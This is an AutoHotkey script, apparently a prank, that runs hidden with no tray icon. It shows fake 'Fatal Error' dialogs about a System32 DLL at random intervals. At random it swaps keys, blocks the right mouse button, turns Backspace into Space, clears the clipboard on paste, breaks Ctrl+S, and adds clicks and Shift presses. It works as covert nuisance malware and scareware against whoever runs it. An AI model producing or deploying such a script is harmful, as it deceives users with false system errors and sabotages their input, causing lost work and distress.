SendMode Input
#NoEnv
#NoTrayIcon
#Persistent
#SingleInstance Force
Random, r, 300000, 600000
SetTimer, randomError, %r%
return


randomError() {
	Random, r, 10000, 600000
	SoundPlay, *-1
	MsgBox, 0x1000,Fatal Error, A Fatal Error has occured in C:\System32\sysconfig.dll.`nRestart your system immediately.
	SetTimer, randomError, %r%
}

#If doEvilStuff(5)
o::i
i::o
m::n
n::m
RButton::return
F2::F1
#::return
BackSpace::Space
^S::Send !

~Shift::	; Will sometimes randomly break shift or activate it too late
Send, {Shift Up}
SetTimer, shiftdown, -100
return

~Enter::
Random, r, 0, 5
if (r = 0) {
SoundPlay *16
Random, c, 0, 1
if (c)
SetTimer, randomError, -4000
}
return

~LButton:: ; sometimes adds clicks to doubleclicks
Sleep, 25
Click
return

~Capslock:: ;// This correctly toggles capslock, and toggles it back after 5 seconds
SetTimer, toggleCapsLock, -5000
return

^V::Clipboard := ""

shiftdown() { 
	Send, {Shift down} 
	Sleep, 200
	Send, {Shift up} 
}

toggleCapsLock() {
	SetCapsLockState % !GetKeyState("CapsLock", "T") 
}

doEvilStuff(max) {
	Random, get, 0, max
	return (get ? 0 : 1)
}
